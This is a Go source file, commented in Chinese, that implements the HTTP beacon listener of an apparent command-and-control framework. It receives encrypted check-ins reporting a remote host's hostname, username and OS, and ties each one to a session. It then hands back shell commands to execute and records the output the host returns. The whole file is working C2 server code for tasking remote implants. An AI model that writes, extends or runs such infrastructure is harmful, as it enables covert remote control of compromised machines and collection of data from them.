package main

// HTTP Beacon 监听器
//
//   请求体: 加密 JSON {hostname,username,os}（beacon）或 {"type":"result","output":...}（回传结果）
//   响应体: 加密 JSON {"type":"exec","command":...} 或 {"type":"heartbeat"}
//
// 同一来源 IP 复用活跃会话（reuse=true），与 Python 版一致。
// 修复项：Python 版无法回写 HTTP 任务结果（result 消息被当 beacon 处理），
// 此处 result 消息写入该会话最近一条 sent 任务。
import (
	"context"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"time"
)

func startHTTP(ctx context.Context, l *listenerMeta, br *Bridge) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/beacon", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		if err != nil {
			writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
			return
		}
		remote := remoteIP(r)

		plain, ok := mustDecryptOrEmpty(string(body), l.Secret, l.Encrypt)
		if !ok {
			logf("[http:%s] beacon 解密失败 %s", l.ID, remote)
			writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
			return
		}
		var data struct {
			Type     string `json:"type"`
			Hostname string `json:"hostname"`
			Username string `json:"username"`
			OS       string `json:"os"`
			Output   string `json:"output"`
		}
		if json.Unmarshal([]byte(plain), &data) != nil {
			writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
			return
		}

		// 找到/创建会话
		sid, err := br.Checkin(CheckinRequest{
			ListenerID: l.ID, RemoteAddr: remote, Reuse: true,
			Hostname: data.Hostname, Username: data.Username, OsInfo: data.OS,
		})
		if err != nil {
			logf("[http:%s] 会话注册失败: %v", l.ID, err)
			writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
			return
		}

		if data.Type == msgResult {
			// 结果回传：写入最近一条 sent 任务
			_ = br.Result(sid, "", data.Output)
			writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
			return
		}

		task, err := br.Poll(sid)
		if err != nil {
			logf("[http:%s] 拉取任务失败: %v", l.ID, err)
			writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
			return
		}
		if task != nil {
			writeBeacon(w, l, map[string]string{"type": msgExec, "command": task.Command})
			return
		}
		writeBeacon(w, l, map[string]string{"type": msgHeartbeat})
	})

	srv := &http.Server{Addr: l.addr(), Handler: mux, ReadHeaderTimeout: 10 * time.Second}
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutdownCtx)
	}()
	go func() {
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logf("[http:%s] 监听失败: %v", l.ID, err)
		}
	}()
	return nil
}

func writeBeacon(w http.ResponseWriter, l *listenerMeta, msg map[string]string) {
	plain := mustJSON(msg)
	enc, err := Encrypt(plain, l.Secret, l.Encrypt)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte(enc))
}

func remoteIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}
